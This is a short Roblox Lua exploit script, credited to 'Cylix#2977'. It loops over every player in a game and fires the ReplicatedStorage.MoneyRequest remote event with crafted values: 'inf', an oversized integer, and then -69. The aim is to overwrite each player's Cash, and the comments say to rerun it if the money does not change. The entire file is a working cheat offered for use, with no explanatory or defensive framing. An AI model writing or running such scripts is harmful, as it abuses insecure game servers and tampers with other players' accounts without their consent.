-- Made by Cylix#2977
-- Change everybodys (Don't stack)
-- if there money doesn't change execute again

local SetMoney = -69

local plyrs = game:GetService("Players")
for _,P in pairs(plyrs:GetPlayers()) do
   local N = {[1] = false, [2] = "inf", [3] = "Cash", [4] = P}
    local UNN = {[1] = false, [2] = "9223372036854776000", [3] = "Cash", [4] = P}
    local SixNine = {[1] = false, [2] = SetMoney, [3] = "Cash", [4] = P}
    
 game:GetService("ReplicatedStorage").MoneyRequest:FireServer(unpack(N))
 task.wait(0.10)
   game:GetService("ReplicatedStorage").MoneyRequest:FireServer(unpack(UNN))
 task.wait(0.10)
    game:GetService("ReplicatedStorage").MoneyRequest:FireServer(unpack(SixNine))
 end